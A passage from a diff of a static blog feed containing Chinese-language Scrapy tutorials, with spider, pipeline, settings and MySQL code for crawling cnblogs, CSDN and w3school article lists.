self.dbpool.runInteraction(self._do_upinsert, item, spider)</div><div class="line">        d.addErrback(self._handle_error, item, spider)</div><div class="line">        d.addBoth(lambda _: item)</div><div class="line">        return d</div><div class="line">    #将每行更新或写入数据库中</div><div class="line">    def _do_upinsert(self, conn, item, spider):</div><div class="line">        linkmd5id = self._get_linkmd5id(item)</div><div class="line">        now = datetime.utcnow().replace(microsecond=0).isoformat(&apos; &apos;)</div><div class="line">        conn.execute(&quot;&quot;&quot;select 1 from cnblogsinfo where linkmd5id = %s&quot;&quot;&quot;, (linkmd5id, ))</div><div class="line">        ret = conn.fetchone()</div><div class="line">        if ret:</div><div class="line">            conn.execute(&quot;&quot;&quot;update cnblogsinfo set title = %s, description = %s, link = %s, updated = %s where linkmd5id = %s	&quot;&quot;&quot;,</div><div class="line">                         (item[&apos;title&apos;], item[&apos;desc&apos;], item[&apos;link&apos;], now, linkmd5id))</div><div class="line">        else:</div><div class="line">            conn.execute(&quot;&quot;&quot;insert into cnblogsinfo(linkmd5id, title, description, link,  updated)values(%s, %s, %s, %s, %s)&quot;&quot;&quot;,</div><div class="line">                         (linkmd5id, item[&apos;title&apos;], item[&apos;desc&apos;], item[&apos;link&apos;],  now))</div><div class="line"></div><div class="line"></div><div class="line">    def _handle_error(self, failue, item, spider):#异常处理</div><div class="line">        pass</div></pre></td></tr></table></figure>
+<ul>
+<li>上面的代码首先从setting文件中读取出数据库的配置信息（在下面添加）</li>
+<li>_get_linkmd5id是获取文章url的md5值</li>
+<li>在插入数据库之前会先查询一次上面的md5值是否已经存在数据库中，如果不存在，那么这就是一条新的数据，直接插入即可；如果已经存在，那么就将这条信息更新一下。</li>
+</ul>
+<h4 id="3-修改settings-py"><a href="#3-修改settings-py" class="headerlink" title="3.修改settings.py"></a>3.修改settings.py</h4><p>将ITEM_PIPELINES中改为<code>&#39;cnblogs.pipelines.MySQLStoreCnblogsPipeline&#39;: 300,</code><br>再添加数据库的配置信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># start MySQL database configure setting</div><div class="line">MYSQL_HOST = &apos;localhost&apos;</div><div class="line">MYSQL_DBNAME = &apos;cnblogsdb&apos;</div><div class="line">MYSQL_USER = &apos;root&apos;</div><div class="line">MYSQL_PASSWD = &apos;root&apos;</div><div class="line"># end of MySQL database configure setting</div></pre></td></tr></table></figure>
+<p>当然上面的信息都是根据自己机器的配置填写。这里面用的数据库是cnblogsdb，所以需要先新建一个数据库和其中的表:sql语句如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE cnblogsdb DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</div><div class="line">CREATE TABLE `cnblogsinfo` (</div><div class="line">  `linkmd5id` char(32) NOT NULL COMMENT &apos;url md5编码id&apos;,</div><div class="line">  `title` text COMMENT &apos;标题&apos;,</div><div class="line">  `description` text COMMENT &apos;描述&apos;,</div><div class="line">  `link` text  COMMENT &apos;url链接&apos;,</div><div class="line">  `updated` datetime DEFAULT NULL  COMMENT &apos;最后更新时间&apos;,</div><div class="line">  PRIMARY KEY (`linkmd5id`)</div><div class="line">) ENGINE=MyISAM DEFAULT CHARSET=utf8;</div></pre></td></tr></table></figure>
+<p>此文件会在工程目录中给出。</p>
+<p>以上就是对于之前保存成json工程的所有更改：</p>
+<h4 id="4-运行"><a href="#4-运行" class="headerlink" title="4.运行"></a>4.运行</h4><p><code>scrapy crawl cnblogs</code></p>
+<p>数据库中的运行结果如下：<br><img src="http://7xljat.com1.z0.glb.clouddn.com/QQ截图20150908125231.jpg" alt=""></p>
+<p>此工程的github地址为:<a href="https://github.com/lowkeynic4/crawl/tree/master/cnblogs%28mysql%29" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/tree/master/cnblogs%28mysql%29</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[scrapy爬取cnblogs博客文章(保存json)]]></title>
+      <url>/2015/07/scrapy-csdn-json/</url>
+      <content type="html"><![CDATA[<p>本文为从某人cnblog的文章列表中爬取文章题目，url，摘要。</p>
+<p>因为作者本人爬取的就是他自己的博客，所以我这里不做更改，只是为学习和记录另一种scrapy的方法。</p>
+<h4 id="1-创建project"><a href="#1-创建project" class="headerlink" title="1.创建project"></a>1.创建project</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">tenshine@tenshine:~$ scrapy startproject cnblogs</div><div class="line">2015-09-08 10:20:43 [scrapy] INFO: Scrapy 1.0.2 started (bot: scrapybot)</div><div class="line">2015-09-08 10:20:43 [scrapy] INFO: Optional features available: ssl, http11</div><div class="line">2015-09-08 10:20:43 [scrapy] INFO: Overridden settings: &#123;&#125;</div><div class="line">New Scrapy project &apos;cnblogs&apos; created in:</div><div class="line">    /home/tenshine/cnblogs</div><div class="line"></div><div class="line">You can start your first spider with:</div><div class="line">    cd cnblogs</div><div class="line">    scrapy genspider example example.com</div></pre></td></tr></table></figure>
+<h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">tenshine@tenshine:~$ tree cnblogs/</div><div class="line">cnblogs/</div><div class="line">├── cnblogs</div><div class="line">│   ├── __init__.py</div><div class="line">│   ├── items.py</div><div class="line">│   ├── pipelines.py</div><div class="line">│   ├── settings.py</div><div class="line">│   └── spiders</div><div class="line">│       ├── cnblogs.py</div><div class="line">│       └── __init__.py</div><div class="line">└── scrapy.cfg</div><div class="line">2 directories, 7 files</div></pre></td></tr></table></figure>
+<ul>
+<li>item.py编写</li>
+</ul>
+<p>这里提取文章标题，文章链接，文章摘要</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import scrapy</div><div class="line"></div><div class="line">class CnblogsItem(scrapy.Item):</div><div class="line">    title = scrapy.Field()</div><div class="line">    link = scrapy.Field()</div><div class="line">    desc = scrapy.Field()</div><div class="line">    pass</div></pre></td></tr></table></figure>
+<ul>
+<li>pipelines.py编写</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import codecs</div><div class="line">import json</div><div class="line">class CnblogsPipeline(object):</div><div class="line">    def __init__(self):</div><div class="line">        self.file = codecs.open(&apos;cnblogs.json&apos;, &apos;w&apos;, encoding=&apos;utf-8&apos;)</div><div class="line">    def process_item(self, item, spider):</div><div class="line">        line = json.dumps(dict(item), ensure_ascii=False) + &quot;\n&quot;</div><div class="line">        self.file.write(line)</div><div class="line">        return item</div><div class="line">    def spider_closed(self, spider):</div><div class="line">        self.file.close()</div></pre></td></tr></table></figure>
+<ul>
+<li>修改settings.py</li>
+</ul>
+<p>对于setting文件，他作为配置文件，主要是至执行对spider的配置。一些容易被改变的配置参数可以放在spider类的编写中，而几乎在爬虫运行过程中不改变的参数在settings.py中进行配置。<br>将ITEM_PIPELINES的注释去掉，并将其中内容改为：<br><code>&#39;cnblogs.pipelines.CnblogsPipeline&#39;: 300,</code>，这个CnblogsPipeline就是在pipelines.py中定义的。</p>
+<h4 id="2-编写爬虫"><a href="#2-编写爬虫" class="headerlink" title="2.编写爬虫"></a>2.编写爬虫</h4><p>这个爬虫是从文章列表页中爬取每篇文章的标题，url，和摘要，但是列表不止一页，那么我们这就是和爬取csdn博客文章不同的地方了，csdn博客是从指定位置找到下一篇文章的url，然后直接访问就行了，而在这里，scrapy是将每个页面中的所有连接都拿到，然后根据我们自定义的规则（rules）来从所有的url中筛选爬虫接下来要访问哪一个url。</p>
+<p>爬取方式既然变了，那么我们爬虫的基类也要变，变成了<code>from scrapy.spiders import CrawlSpider</code>，并且回调函数就不可以用parse了，而需要自己重新定义并指定。<br>在spider文件夹中创建cnblogs_spider.py文件，文件代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">from scrapy.selector import Selector</div><div class="line">try:</div><div class="line">    from scrapy.spiders import Spider</div><div class="line">except:</div><div class="line">    from scrapy.spider import BaseSpider as Spider</div><div class="line">from scrapy.utils.response import get_base_url</div><div class="line">from scrapy.spiders import CrawlSpider, Rule</div><div class="line">from scrapy.linkextractors.sgml import SgmlLinkExtractor as sle</div><div class="line">from cnblogs.items import *</div><div class="line">class CnblogsSpider(CrawlSpider):</div><div class="line">    #定义爬虫的名称</div><div class="line">    name = &quot;cnblogs&quot;</div><div class="line">    #定义允许抓取的域名,如果不是在此列表的域名则放弃抓取</div><div class="line">    allowed_domains = [&quot;cnblogs.com&quot;]</div><div class="line">    #定义抓取的入口urls</div><div class="line">    start_urls = [&quot;http://www.cnblogs.com/rwxwsblog/default.html?page=1&quot;]</div><div class="line">    # 定义爬取URL的规则，并指定回调函数为parse_item</div><div class="line">    rules = [</div><div class="line">        #此处要注意?号的转换，复制过来需要对?号进行转换。</div><div class="line">        Rule(sle(allow=(&quot;/rwxwsblog/default.html\?page=\d&#123;1,&#125;&quot;)),</div><div class="line">			 follow=True,</div><div class="line">			 callback=&apos;parse_item&apos;)</div><div class="line">    ]</div><div class="line"></div><div class="line">    #定义回调函数</div><div class="line">    def parse_item(self, response):</div><div class="line">        items = []</div><div class="line">        sel = Selector(response)</div><div class="line">        #base_url = get_base_url(response)#获取当页来自哪个url</div><div class="line">        #print base_url</div><div class="line">        #div.day=div的class属性是day,然后空格表示下级在找div的class为postTitle的所有元素</div><div class="line">        postTitle = sel.css(&apos;div.day div.postTitle&apos;)</div><div class="line">        postCon = sel.css(&apos;div.postCon div.c_b_p_desc&apos;)</div><div class="line">        for index in range(len(postTitle)):</div><div class="line">            item = CnblogsItem()</div><div class="line">            item[&apos;title&apos;] = postTitle[index].css(&quot;a&quot;).xpath(&apos;text()&apos;).extract()[0]</div><div class="line">            item[&apos;link&apos;] = postTitle[index].css(&apos;a&apos;).xpath(&apos;@href&apos;).extract()[0]</div><div class="line">            item[&apos;desc&apos;] = postCon[index].xpath(&apos;text()&apos;).extract()[0]</div><div class="line">            items.append(item)</div><div class="line">        return items</div></pre></td></tr></table></figure>
+<p>先说下这个爬虫的运行过程，我们将此人的文章列表的第一页作为这个爬虫的start_urls，在这里我们没有明确指定爬虫要进入的下一个url是什么，所以默认爬虫会进入它拿到的所有url，这样对我们来说是没用的，因为我们只想爬虫进入此人的所有文章列表页而已，通过观察cnblogs文章列表的页很有规律<code>http://www.cnblogs.com/rwxwsblog/default.html?page=?</code>，后面？对应的就是每一页的文章列表。所以我们在用正则表达式定义了一个规则：<code>/rwxwsblog/default.html\?page=\d{1,}</code>匹配page的数字是[0-9]1次到无限次。也就是说爬虫会根据这个规则来决定进入哪个url。</p>
+<p>上面做的就是可以将此人的所有文章列表页都可以进入了，下一步就是在每一个文章列表页中爬取我们需要的信息了，在这里是是用的xpath和css选择器协同使用，如不了解请查看<a href="http://www.w3school.com.cn/xpath/" target="_blank" rel="external">xpath</a>，<a href="http://www.w3school.com.cn/cssref/css_selectors.asp" target="_blank" rel="external">css选择器</a>。</p>
+<h4 id="3-运行"><a href="#3-运行" class="headerlink" title="3.运行"></a>3.运行</h4><p>进入cnblogs工程目录，运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scrapy crawl cnblogs(spider中定义的名称)</div></pre></td></tr></table></figure></p>
+<p>下面是保存在json文件中的运行结果：<br><img src="http://7xljat.com1.z0.glb.clouddn.com/QQ截图20150908120916.jpg" alt=""></p>
+<h4 id="4-分析CrawlSpider"><a href="#4-分析CrawlSpider" class="headerlink" title="4.分析CrawlSpider"></a>4.分析CrawlSpider</h4><ul>
+<li><p>概念与作用<br>它是spiders 的派生类，首先在说下spiders ，它是所有爬虫的基类，对于它的设计原则是只爬取start_url列表中的网页，而从爬取的网页中获取link并继续爬取的工作CrawlSpider类更适合。</p>
+</li>
+<li><p>使用<br>它与Spider类的最大不同是多了一个rules参数，其作用是定义提取动作。在rules中包含一个或多个Rule对象。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">def __init__(self, link_extractor, callback=None, cb_kwargs=None,</div><div class="line">             follow=None, process_links=None, process_request=identity):</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>其中：</p>
+<ul>
+<li>link_extractor为LinkExtractor，用于定义需要提取的链接。</li>
+<li>callback参数：当link_extractor获取到链接时参数所指定的值作为回调函数。<blockquote>
+<p>callback参数使用注意：<br>当编写爬虫规则时，请避免使用parse作为回调函数。于CrawlSpider使用parse方法来实现其逻辑，如果您覆盖了parse方法，crawlspider将会运行失败。</p>
+</blockquote>
+</li>
+<li>follow：指定了根据该规则从response提取的链接是否需要跟进。当callback为None,默认值为true。</li>
+<li>process_links：主要用来过滤由link_extractor获取到的链接。</li>
+<li>process_request：主要用来过滤在rule中提取到的request。</li>
+</ul>
+<ul>
+<li><p>LinkExtractor<br>顾名思义，链接提取器。它的作用及时从response对象中获取链接，并且该链接会被接下来爬取。<br>可以通过SmglLinkExtractor提取希望获取的链接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">allow=(),deny=(),allow_domains=(),deny_domains=(),deny_extensions=None,restrict_xpaths=(),tags=(&apos;a&apos;,&apos;area&apos;),attrs=(&apos;href&apos;),canonicalize=True,unique=True,process_value=None)</div></pre></td></tr></table></figure>
+<ul>
+<li>allow：满足括号中“正则表达式”的值会被提取，如果为空，则全部匹配。</li>
+<li>deny：与这个正则表达式(或正则表达式列表)不匹配的URL一定不提取。</li>
+<li>allow_domains：会被提取的链接的domains。</li>
+<li>deny_domains：一定不会被提取链接的domains。</li>
+<li>restrict_xpaths：使用xpath表达式，和allow共同作用过滤链接。</li>
+</ul>
+</li>
+</ul>
+<p>此工程的github地址：<a href="https://github.com/lowkeynic4/crawl/tree/master/cnblogs" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/tree/master/cnblogs</a></p>
+<p>本文转自：<a href="http://www.cnblogs.com/rwxwsblog/p/4567052.html" target="_blank" rel="external">http://www.cnblogs.com/rwxwsblog/p/4567052.html</a> 加上本人新增理解和改动</p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+            <tag> scrapy </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[scrapy爬取csdn博客文章]]></title>
+      <url>/2015/07/scrapy-csdn/</url>
+      <content type="html"><![CDATA[<p>本文为爬取某人csdn博客中文章题目和url，因为作者本人爬取的就是他自己的博客，所以我这里不做更改，只是为学习和记录一种scrapy的方法。
+　　</p>
+<h4 id="1-创建project"><a href="#1-创建project" class="headerlink" title="1.创建project"></a>1.创建project</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">nick@ubuntu:~$ scrapy startproject csndblog</div><div class="line">2015-09-07 22:24:29 [scrapy] INFO: Scrapy 1.0.2 started (bot: scrapybot)</div><div class="line">2015-09-07 22:24:29 [scrapy] INFO: Optional features available: ssl, http11, boto</div><div class="line">2015-09-07 22:24:29 [scrapy] INFO: Overridden settings: &#123;&#125;</div><div class="line">New Scrapy project &apos;csndblog&apos; created in:</div><div class="line">    /home/nick/csndblog</div><div class="line"></div><div class="line">You can start your first spider with:</div><div class="line">    cd csndblog</div><div class="line">    scrapy genspider example example.com</div></pre></td></tr></table></figure>
+<ul>
+<li>items.py编写</li>
+</ul>
+<p>在这里为清晰说明，只提取文章名称和文章网址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">import scrapy</div><div class="line">class CsndblogItem(scrapy.Item):</div><div class="line">    article_name = scrapy.Field()</div><div class="line">    article_url = scrapy.Field()</div><div class="line">    pass</div></pre></td></tr></table></figure>
+<ul>
+<li>pipelines.py编写</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import codecs</div><div class="line">import json</div><div class="line">class CsdnblogPipeline(object):</div><div class="line">    def __init__(self):</div><div class="line">        self.file = codecs.open(&apos;csdnblog_data.json&apos;, mode=&apos;wb&apos;, encoding=&apos;utf-8&apos;)</div><div class="line"></div><div class="line">    def process_item(self, item, spider):</div><div class="line">        line = json.dumps(dict(item)) + &apos;\n&apos;</div><div class="line">        self.file.write(line.decode(&quot;unicode_escape&quot;))</div><div class="line"></div><div class="line">        return item</div></pre></td></tr></table></figure>
+<ul>
+<li>settings.py编写</li>
+</ul>
+<p>对于setting文件，他作为配置文件，主要是至执行对spider的配置。一些容易被改变的配置参数可以放在spider类的编写中，而几乎在爬虫运行过程中不改变的参数在settings.py中进行配置。<br>将ITEM_PIPELINES的注释去掉，并将其中内容改为：<br><code>&#39;csdnblog.pipelines.CsdnblogPipeline&#39;: 300,</code>这个CSdnblogPipeline就是在pipelines中定义的。</p>
+<p>再加上一句<code>COOKIES_ENABLED = False</code><br>这里将COOKIES_ENABLED参数置为True，使根据cookies判断访问的站点不能发现爬虫轨迹，防止被ban。</p>
+<h4 id="2-编写爬虫"><a href="#2-编写爬虫" class="headerlink" title="2.编写爬虫"></a>2.编写爬虫</h4><p>爬虫编写始终是重头戏。原理是分析网页得到“下一篇”的链接，并返回Request对象。进而继续爬取下一篇文章，直到最后一篇文章。<br>在spider文件夹下创建文件csdnblog_spider.py，文件代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">#coding:utf-8</div><div class="line">from scrapy.spiders import Spider</div><div class="line">from scrapy.http import Request</div><div class="line">from scrapy.selector import Selector</div><div class="line">from csdnblog.items import CsdnblogItem</div><div class="line"></div><div class="line">class CSDNBlogSpider(Spider):</div><div class="line">    name = &quot;csdnblog&quot;</div><div class="line">    download_delay = 1#减慢爬取速度 为1s</div><div class="line">    allowed_domains = [&quot;blog.csdn.net&quot;]</div><div class="line">    #第一篇文章地址</div><div class="line">    start_urls = [&quot;http://blog.csdn.net/u012150179/article/details/11749017&quot;]</div><div class="line"></div><div class="line">    def parse(self, response):</div><div class="line">        sel = Selector(response)</div><div class="line">        item = CsdnblogItem()</div><div class="line"></div><div class="line">        article_url = str(response.url)#本篇文章的url</div><div class="line">        article_name = sel.xpath(&apos;//div[@id=&quot;article_details&quot;]/div/h1/span/a/text()&apos;).extract()[0]</div><div class="line">        item[&apos;article_name&apos;] = article_name</div><div class="line">        item[&apos;article_url&apos;] = article_url.encode(&apos;utf-8&apos;)</div><div class="line">        yield item</div><div class="line"></div><div class="line">        #获得下一篇文章的url</div><div class="line">        url = sel.xpath(&apos;//li[@class=&quot;next_article&quot;]/a/@href&apos;).extract()[0]</div><div class="line">        urls = &quot;http://blog.csdn.net&quot; + url</div><div class="line">        yield Request(urls, callback=self.parse)</div></pre></td></tr></table></figure>
+<p>　　先说下爬虫的整个运行过程，我们将这个博客的第一篇文章的url个爬虫程序作为start_urls，因为在阅读文章的最下面都有一个上一篇和下一篇的链接，这个链接的a标签的class属性值为”next_article”是唯一的：所以在获取到一篇文章后只需得到这个便签中的url即可，它与csdn的blog域名连接起来就是下一篇文章的url，只要持续这个过程直到最后一篇文章没有这个便签了就相当于结束了。下面来分析上面的代码：
+　</p>
+<ul>
+<li><p>download_delay参数设置为1，将下载器下载下一个页面前的等待时间设置为1s，也是防止被ban的策略之一。主要是减轻服务器端负载。</p>
+</li>
+<li><p>因为我们的基类是<code>from scrapy.spiders import Spider</code>，parse函数为爬虫默认的回调函数，所有对信息的处理都在它其中进行。</p>
+</li>
+<li><p>文章的题目是利用xpath去匹配的，XPath 是一门在 XML 文档中查找信息的语言，css选择器和XPath是许多爬虫中匹配信息的两种方式，不了解的推荐去w3school学习一下,<a href="http://www.w3school.com.cn/cssref/css_selectors.asp" target="_blank" rel="external">css选择器</a>，<a href="http://www.w3school.com.cn/xpath/" target="_blank" rel="external">XPath</a>。</p>
+</li>
+<li><p>response.url是此次response的地址，也就是我们这次访问的地址。</p>
+</li>
+<li><p>用我理解解释下yield，我也是刚接触这个函数，网上给的太晦涩了，我就说下在这的含义：正常一个函数返回是用return，然后就回到调用此函数的地方去了，return下面的语句就都不执行了，而yield的作用和return在某种程度上是类似的，它也起到返回的作用，但是我们可以看到它的下面还有语句，这就是yield和return的不同之处，如果yield执行完继续去下面的语句寻找是否还有另一个yield，如果找到了，那么这其中的所有代码都会执行，直到某一个yield发现他的下面没有其他yield了那么这个函数才算正式退出了。</p>
+</li>
+<li><p><code>yield Request(url, callback=self.parse)</code> 这句话的意思是将从页面中提取出的下一篇文章的地址返回给引擎，样子好像似递归一样，这样就实现了继续循环，也就是“自动下一页的爬取”。</p>
+</li>
+</ul>
+<h4 id="3-运行"><a href="#3-运行" class="headerlink" title="3.运行"></a>3.运行</h4><p>进入csdnblog工程目录，运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nick@ubuntu:~/csdnblog$ scrapy crawl csdnblog</div></pre></td></tr></table></figure>
+<p>最终保存到csdnblog_data.json文件中，下面是截取的一部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;article_name&quot;: &quot;</div><div class="line">        写在开始</div><div class="line">        &quot;, &quot;article_url&quot;: &quot;http://blog.csdn.net/u012150179/article/details/11749017&quot;&#125;</div><div class="line">&#123;&quot;article_name&quot;: &quot;</div><div class="line">        Python相关介绍（很好）</div><div class="line">        &quot;, &quot;article_url&quot;: &quot;http://blog.csdn.net/u012150179/article/details/11836503&quot;&#125;</div><div class="line">&#123;&quot;article_name&quot;: &quot;</div><div class="line">        脚本语言为何难堪重任？</div><div class="line">        &quot;, &quot;article_url&quot;: &quot;http://blog.csdn.net/u012150179/article/details/11837005&quot;&#125;</div><div class="line">&#123;&quot;article_name&quot;: &quot;</div><div class="line">        ubuntu study</div><div class="line">        &quot;, &quot;article_url&quot;: &quot;http://blog.csdn.net/u012150179/article/details/12073527&quot;&#125;</div></pre></td></tr></table></figure>
+<p>此工程github地址：<a href="https://github.com/lowkeynic4/crawl/tree/master/csdnblog" target="_blank" rel="external">https://github.com/lowkeynic4/crawl/tree/master/csdnblog</a></p>
+<p>本文转自：<a href="http://blog.csdn.net/u012150179/article/details/34486677" target="_blank" rel="external">http://blog.csdn.net/u012150179/article/details/34486677</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 爬虫 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 爬虫 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[scrapy入门爬取w3school]]></title>
+      <url>/2015/07/scrapy-w3school/</url>
+      <content type="html"><![CDATA[<p>首先推荐一个系列教程<a href="http://blog.csdn.net/u012150179/article/category/2345511" target="_blank" rel="external">http://blog.csdn.net/u012150179/article/category/2345511</a></p>
+<p>此篇文章就是根据上边系列中的<a href="blog.csdn.net/u012150179/article/details/32911511">scrapy研究探索（二）——爬w3school.com.cn</a>学习总结更改而来</p>
+<h4 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h4><p>　　scapy的安装请自行百度，我最开始安装的时候遇到颇多的问题，但大多都是缺少库引起的，所以安装中遇到问题时的中心思想就是看错误提示，缺少什么库就去安装什么库。<br>　　在开始之前假设你已经安装好了环境，我们今天要利用scrapy爬取的是<a href="http://www.w3school.com.cn/xpath/" target="_blank" rel="external">w3school的XPath教程中的导航栏</a>如下图：<br><img src="http://7xljat.com1.z0.glb.clouddn.com/QQ截图20150907162346.jpg" alt=""></p>
+<ul>
+<li>创建项目</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">tenshine@tenshine:~$ scrapy startproject w3school</div><div class="line">2015-09-07 16:26:12 [scrapy] INFO: Scrapy 1.0.2 started (bot: scrapybot)</div><div class="line">2015-09-07 16:26:12 [scrapy] INFO: Optional features available: ssl, http11</div><div class="line">2015-09-07 16:26:12 [scrapy] INFO: Overridden settings: &#123;&#125;</div><div class="line">New Scrapy project &apos;w3school&apos; created in:</div><div class="line">    /home/tenshine/w3school</div><div class="line"></div><div class="line">You can start your first spider with:</div><div class="line">    cd w3school</div><div class="line">    scrapy genspider example example.com</div></pre></td></tr></table></figure>
+<p>这样就在当前目录中新建了这个项目的目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">tenshine@tenshine:~$ tree w3school/</div><div class="line">w3school/</div><div class="line">├── scrapy.cfg</div><div class="line">└── w3school</div><div class="line">    ├── __init__.py</div><div class="line">    ├── items.py</div><div class="line">    ├── pipelines.py</div><div class="line">    ├── settings.py</div><div class="line">    └── spiders</div><div class="line">        └── __init__.py</div></pre></td></tr></table></figure>
+<p>其中scrapy.cfg是项目的配置文件。主要改写的是w3school中的三个文件以及其中spiders需要新建爬虫文件并编写。</p>
+<ul>
+<li>在item.py中定义item容器</li>
+</ul>
+<p>所谓item容器，就是给将要爬取的项定义一个数据结构，它工作方式像python里面的字典，比如我要爬取文章标题，我要定义一个<code>title=scrapy.Field()</code><br>所以item.py中的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import scrapy</div><div class="line"></div><div class="line">class W3SchoolItem(scrapy.Item):</div><div class="line">    title = scrapy.Field()#标题</div><div class="line">    link = scrapy.Field()#链接地址</div><div class="line">    desc = scrapy.Field()#描述</div><div class="line">    pass</div></pre></td></tr></table></figure>
+<ul>
+<li>在pipelines.py中编写W3schoolPipeline实现对item的处理</li>
+</ul>
+<p>在其中主要完成数据的查重、丢弃，验证item中数据，将得到的item数据保存等工作。代码如下：</p>
